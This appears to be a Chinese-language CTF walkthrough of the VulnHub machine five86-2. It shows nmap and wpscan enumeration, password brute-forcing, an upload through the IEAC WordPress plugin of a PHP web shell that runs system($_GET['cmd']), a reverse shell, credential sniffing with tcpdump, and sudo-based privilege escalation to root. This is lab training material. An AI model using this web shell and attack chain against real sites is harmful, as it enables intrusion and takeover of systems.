靶机地址：<http://www.vulnhub.com/entry/five86-2,418/>

本文涉及知识点实操练习：相关实验：[VulnHub渗透测试实战靶场Node 1.0
](https://www.hetianlab.com/expc.do?ec=ECIDdb58-4b9d-427b-b7b3-8382c7e0a7f5&pk_campaign=freebuf-wemedia)（Node 1.0 是一个难度为中等的Boot2root/CTF挑战，靶场环境最初由 HackTheBox
创建，实验目的是获取两个flag）

#  **技术点总结**

• 对WordPress网站的渗透

– [wpscan](sectool/174663.html)

• WordPress中IEAC插件的RCE漏洞

– [WordPress插件IEAC漏洞分析及组合利用尝试](vuls/205735.html)

• tcpdump的使用

– [tcpdump使用详解](https://www.cnblogs.com/lvdongjie/p/10911564.html)

#  **目标发现**

nmap -sP 参数使用 ping 扫描局域网主机，目的地址为 192.168.56.6

![扫描局域网主机](https://image.3001.net/images/20210122/1611302751_600a875facedc48d7ea66.jpg!small)

nmap -A 192.168.56.6 -p- 可以看到目标主机的一些信息，-A 是进行操作系统指纹和版本检测，-p- 是全端口

![目标主机的一些信息](https://image.3001.net/images/20210122/1611302753_600a8761dc5ffa96ba1f3.jpg!small)

开放了 22、21、80 端口，并且 80 端口是WordPress 5.1.4的CMS

这里最好提前在/etc/hosts中加上192.168.56.6 five86-2这一条，因为后面访问wordpress的后台wp-admin时会跳转到到这个域名

![跳转到到这个域名](https://image.3001.net/images/20210122/1611302754_600a8762e1daf5fdbc6e7.jpg!small)

#  **漏洞发现与利用**

在searchsploit和Google并没有发现WordPress
5.1.4的漏洞，可以用wpscan扫描一下这个URL。wpscan是一款针对WordPress的扫描器，详细的使用可以参考[WPScan使用完整攻略](sectool/174663.html)。

默认扫描会返回目标站点的中间件、XML-RPC、readme文件、上传路径、WP-Corn、版本、主题、所有的插件和备份文件。

命令wpscan -u <http://192.168.56.6/>

![命令wpscan](https://image.3001.net/images/20210122/1611302755_600a8763e59d69e8f01d2.jpg!small)

这里并没有发现很有用的信息，考虑去枚举用户名，然后配合rockyou.txt去爆破密码。爆破用户名命令wpscan --url
<http://192.168.56.6/>\--enumerate u，发现了5个用户

peteradminbarneygillianstephen

![wps5.jpg](https://image.3001.net/images/20210122/1611302757_600a8765d9a1f8362ff32.jpg!small)

爆破密码命令wpscan --url <http://192.168.56.6/>-U user.txt -P
/usr/share/wordlists/rockyou.txt

![6.png](https://image.3001.net/images/20210122/1611302758_600a8766f1d086f330209.png!small)

最终爆破出来两个结果

Username: barney, Password: spooky1Username: stephen, Password: apollo1

使用barney登录后台<http://five86-2/wp-admin/>，可以看到这个站点安装了三个插件，但是只激活了一个Insert or
Embed Articulate Content into WordPress Trial（IEAC）

Akismet Anti-Spam Version 4.1.1Hello Dolly Version 1.7.1IEAC Version 4.2995

![7.png](https://image.3001.net/images/20210122/1611302759_600a8767b97531825d94d.png!small)

在谷歌上搜索一下，不难搜到这个插件的RCE：[WordPress插件IEAC漏洞分析及组合利用尝试](vuls/205735.html)，在[exploit-db](https://www.exploit-db.com/exploits/46981)上也有

先生成poc.zip，

echo "hello" > index.htmlecho "<?php echo system($_GET['cmd']); ?>" >
index.phpzip poc.zip index.html index.php

然后登录wordpress后台，选择新建文章

![8.png](https://image.3001.net/images/20210122/1611302760_600a8768b61913b354cb7.png!small)

选择添加区块

![9.png](https://image.3001.net/images/20210122/1611302761_600a87695af0560840529.png!small)

选择E-Learning

![10.png](https://image.3001.net/images/20210122/1611302762_600a876a20873b82d0667.png!small)

上传poc.zip

![11.png](https://image.3001.net/images/20210122/1611302762_600a876aa6219c4eef65e.png!small)

选择Insert As iFrame

![12.png](https://image.3001.net/images/20210122/1611302763_600a876b3a29ec81a1cf1.png!small)

可以看到上传的位置，也就是说上次的shell位置为<http://192.168.56.6/wp-content/uploads/articulate_uploads/poc/index.php>

![13.png](https://image.3001.net/images/20210122/1611302763_600a876bd8c5dd8e5d3de.png!small)

测试shell<http://192.168.56.6/wp-content/uploads/articulate_uploads/poc/index.php?cmd=whoami>这就拿到了shell

![14.png](https://image.3001.net/images/20210122/1611302764_600a876c6624eb7f791e5.png!small)

使用php-reverse-shell去反弹shell，访问<http://192.168.56.6/wp-content/uploads/articulate_uploads/poc4/shell.php>就可以看到反弹的shell，还不是TTY，接下来就想办法变成TTY吧

![15.png](https://image.3001.net/images/20210122/1611302765_600a876d1e377c41b7fd3.png!small)

![16.png](https://image.3001.net/images/20210122/1611302765_600a876db7c6ca7c9de17.png!small)

ls /home发现有8个目录，刚刚爆破来两个密码，一个登陆了后台，还有一个没有测试，并且两个都在这8个用户里面。可以先试试su
barney，密码填spooky1，发现失败，再试试stephen，密码apollo1。这里的shell不知道为什么没有前面的$了，但是可以用

![17.png](https://image.3001.net/images/20210122/1611302766_600a876e6b3b4125fd2bc.png!small)

实际上，这里的www-data可以直接使用python3 -c 'import
pty;pty.spawn("/bin/bash")'变成TTY，这样可能更方便一些

![18.png](https://image.3001.net/images/20210122/1611302767_600a876f24b0f68de1159.png!small)

然后再sudo -l发现需要密码，并且不是spooky1，所以还是su
stephen吧，发现stephen在一个名为pcap的用户组中（pcap不是流量包吗^_^）

![19.png](https://image.3001.net/images/20210122/1611302767_600a876fa87862bc74a71.png!small)

然后sudo -l发现无法执行sudo

![20.png](https://image.3001.net/images/20210122/1611302768_600a87704d1ee111f950e.png!small)

回到pcap那里，流量包是不是意味着流量分析，尝试ifconfig发现没有这个命令，但是可以使用ip add，发现目前运行着几个网络接口

![21.png](https://image.3001.net/images/20210122/1611302768_600a8770dbf89a0de4999.png!small)

这里的最后一个接口好像是动态的，每次都不一样，可以使用tcpdump
-D列出可用于抓包的接口。这里选择把后面两个抓下来，因为不怎么常见。抓包命令为timeout 120 tcpdump -w 1.pcap -i
veth2c37c59，其中timeout 120是指2分钟，-w是将结果输出到文件，-i是指定监听端口

![22.png](https://image.3001.net/images/20210122/1611302769_600a8771bd0e7170f2cd0.png!small)

![23.png](https://image.3001.net/images/20210122/1611302770_600a877266240899f86ae.png!small)

可以去分析一下这两个流量包，命令tcpdump -r 1.pcap，这里-r是从给定的流量包读取数据，不难发现paul用户FTP的密码esomepasswford。后面2.pcap与1.pcap内容相同。

![24.png](https://image.3001.net/images/20210122/1611302771_600a8773560385e6b6e73.png!small)

接着su paul，用上面的那个密码发现可以登陆。尝试sudo -l发现stephen可以使用peter的service命令

![25.png](https://image.3001.net/images/20210122/1611302772_600a87749d8c3d7dd32ac.png!small)

那不就可以直接执行peter的/bin/bash了吗。命令sudo -u peter service
/bin/bash。这里要注意一下目录的问题，用相对目录找到/bin/bash的位置

![26.png](https://image.3001.net/images/20210122/1611302773_600a8775440eab506c134.png!small)

获取peter的权限后，还是先sudo -l，发现他可以运行root用户的passwd命令，这我直接修改root的密码不就获取root权限了吗

![27.png](https://image.3001.net/images/20210122/1611302773_600a8775d97b87e8ae0e6.png!small)

是时候表演真正的技术了。sudo -u root passwd root(强迫症，全文一致)，用sudo passwd root一样的

![28.png](https://image.3001.net/images/20210122/1611302774_600a877671b3dcadf5c77.png!small)

找到flag

![找到flag](https://image.3001.net/images/20210122/1611302775_600a87772d1e4b20f24eb.png!small)

